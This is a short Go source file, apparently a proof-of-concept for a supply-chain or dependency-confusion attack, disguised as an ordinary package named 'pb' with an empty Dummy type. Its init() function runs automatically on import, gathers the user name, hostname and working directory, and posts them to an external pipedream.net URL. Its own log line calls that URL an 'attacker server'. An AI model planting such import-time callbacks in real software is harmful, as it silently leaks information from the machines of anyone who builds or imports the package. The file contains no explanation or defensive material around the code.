package pb

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
)

type Dummy struct{}

func init() {
	user := os.Getenv("USER")
	hostname, _ := os.Hostname()
	cwd, _ := os.Getwd()

	data := url.Values{}
	data.Set("user", user)
	data.Set("cwd", cwd)
	data.Set("host", hostname)

	
	vpsURL := "https://eou39l9f2i96s48.m.pipedream.net/poc"

	_, err := http.PostForm(vpsURL, data)
	if err != nil {
		fmt.Println("[PoC] Callback failed:", err)
	} else {
		fmt.Println("[PoC] Callback sent to attacker server.")
	}
}
